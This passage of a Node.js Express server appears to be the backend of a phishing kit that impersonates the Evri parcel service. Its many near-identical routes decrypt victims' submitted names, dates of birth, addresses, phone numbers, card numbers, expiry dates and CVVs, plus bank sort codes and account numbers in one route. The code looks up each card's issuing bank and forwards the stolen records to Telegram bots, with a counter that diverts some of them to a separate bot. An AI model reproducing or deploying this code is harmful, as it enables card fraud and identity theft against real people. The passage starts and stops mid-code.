    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriBarksdale:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5192776933,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/baliEvri", cors());

app.post("/baliEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriBali:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1983666674,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

let dpFullz = 0;

app.options("/dpEvri", cors());

app.post("/dpEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (dpFullz == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriDP:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5582405778,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        dpFullz += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/spooferEvri", cors());

app.post("/spooferEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriSpoofer:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 993063133,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }

      res.send("Update Completed");
    });
});

let truth = 0;

app.options("/truthEvri", cors());

app.post("/truthEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ciscoCount = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriTruth:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 916438269,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ciscoCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/goblinzEvri", cors());

app.post("/goblinzEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (truth == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        truth = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriGoblinz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 956029722,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        truth += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ciscoEvri", cors());

app.post("/ciscoEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ciscoCount = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriCisco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1911692807,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ciscoCount += 1;
      }

      res.send("Update Completed");
    });
});

let pweight = 0;

app.options("/pweightEvri", cors());

app.post("/pweightEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pweight == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `pweightEvri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5516677945,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pweight += 1;
      }

      res.send("Update Completed");
    });
});

let ufo = 0;

app.options("/ufoEvri", cors());

app.post("/ufoEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ufo == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ufo = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriUFO:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 946801551,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        ufo += 1;
      }

      res.send("Update Completed");
    });
});

let youwantfame = 0;

app.options("/ywfEvri", cors());

app.post("/ywfEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (youwantfame == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        youwantfame = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriYWF:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 969641538,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        youwantfame += 1;
      }

      res.send("Update Completed");
    });
});

let saim = 0;

app.options("/saimEvri", cors());

app.post("/saimEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (saim == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim = 5;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
